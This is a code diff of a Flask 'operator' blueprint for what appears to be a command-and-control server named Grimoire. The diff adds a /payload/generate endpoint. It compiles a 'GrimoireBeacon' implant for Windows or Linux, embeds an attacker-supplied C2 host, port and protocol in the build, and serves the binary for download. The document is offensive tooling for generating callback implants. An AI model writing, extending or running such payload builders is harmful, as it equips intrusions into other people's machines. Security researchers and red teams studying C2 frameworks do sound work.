@@ -1,8 +1,10 @@
 # 操作的地方
-
-from flask import Blueprint, jsonify, current_app, request
+import os
+import shutil
+import subprocess
+import uuid
+from flask import Blueprint, jsonify, current_app, request, send_file
 from flask_jwt_extended import jwt_required
-
 from server.persistence.database import get_db_session
 
 # 蓝图定义，URL 前缀为 /operator
@@ -126,6 +128,7 @@ def get_beacon_history(beacon_id):
     services = get_services()
     task_service = services['task_service']
 
+
     try:
         # 验证 Beacon ID
         if not beacon_id or len(beacon_id) != 64:
@@ -173,3 +176,88 @@ def get_beacon_history(beacon_id):
     except Exception as e:
         print(f"[ERROR] Failed to retrieve task history for {beacon_id}: {e}")
         return jsonify({"error": "Internal server error"}), 500
+
+
+@operator_bp.route('/payload/generate', methods=['POST'])
+@jwt_required()
+def generate_payload():
+    win_env = os.environ.copy()
+    data = request.json
+    c2_host = data.get('host', '127.0.0.1')
+    c2_port = data.get('port', '8080')
+    c2_proto = data.get('protocol', 'http://')
+    target_os = data.get('platform', 'windows')  # 获取前端传来的平台
+
+    base_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
+    source_dir = os.path.join(base_dir, "beacon")
+
+    # 临时目录
+    build_id = str(uuid.uuid4())[:8]
+    work_dir = os.path.abspath(os.path.join(base_dir, f"tmp/build_{build_id}"))
+    os.makedirs(work_dir, exist_ok=True)
+
+    try:
+        cmake_configure = ["cmake"]
+
+        if target_os == 'windows':
+            clion_mingw_bin = "D:/IDEs/CLion 2025.3.2/bin/mingw/bin"
+            clion_mingw_bin = os.path.normpath(clion_mingw_bin)
+            win_env["PATH"] = clion_mingw_bin + os.pathsep + win_env["PATH"]
+            cmake_configure += [
+                "-G", "MinGW Makefiles",
+                f"-DCMAKE_C_COMPILER={os.path.join(clion_mingw_bin, 'gcc.exe')}",
+                f"-DCMAKE_CXX_COMPILER={os.path.join(clion_mingw_bin, 'g++.exe')}",
+                f"-DCMAKE_MAKE_PROGRAM={os.path.join(clion_mingw_bin, 'mingw32-make.exe')}"
+            ]
+            extension = ".exe"
+            binary_name = "GrimoireBeacon.exe"
+
+        elif target_os == 'linux':
+            cmake_configure += [
+                "-G", "Unix Makefiles",
+                "-DCMAKE_C_COMPILER=gcc",
+                "-DCMAKE_CXX_COMPILER=g++"
+            ]
+            extension = ".elf"
+            binary_name = "GrimoireBeacon"# Linux 默认没后缀
+        else:
+            return jsonify({"error": "不支持的平台，你难道想编个游戏机版吗？"}), 400
+
+        # 注入注入宏定义
+        cmake_configure += [
+            f"-DC2_HOST_CONFIG={c2_host}",
+            f"-DC2_PORT_CONFIG={c2_port}",
+            f"-DC2_PROTOCOL_CONFIG={c2_proto}",
+            "-DCMAKE_BUILD_TYPE=Release",
+            source_dir
+        ]
+
+
+
+        # 配置并编译
+        result = subprocess.run(cmake_configure, cwd=work_dir, capture_output=True, text=True, encoding='utf-8',env=win_env)
+
+
+        # if result.returncode != 0:
+        #     print(result.stdout)
+        #     print(result.stderr)
+        #     return jsonify({
+        #         "error": "CMake失败",
+        #         "details": result.stderr if result.stderr else result.stdout
+        #     }), 500
+
+
+
+        subprocess.run(["cmake", "--build", ".", "--config", "Release", "-j4"],
+                       cwd=work_dir, capture_output=True, text=True, check=True,env=win_env)
+
+
+        payload_path = os.path.join(work_dir, binary_name)
+        if os.path.exists(payload_path):
+            return send_file(payload_path, as_attachment=True, download_name=f"Grimoire_{build_id}{extension}")
+
+    except subprocess.CalledProcessError as e:
+        return jsonify({"error": "失败", "details": e.stderr or e.stdout}), 500
+    finally:
+        shutil.rmtree(work_dir, ignore_errors=True)
+        pass
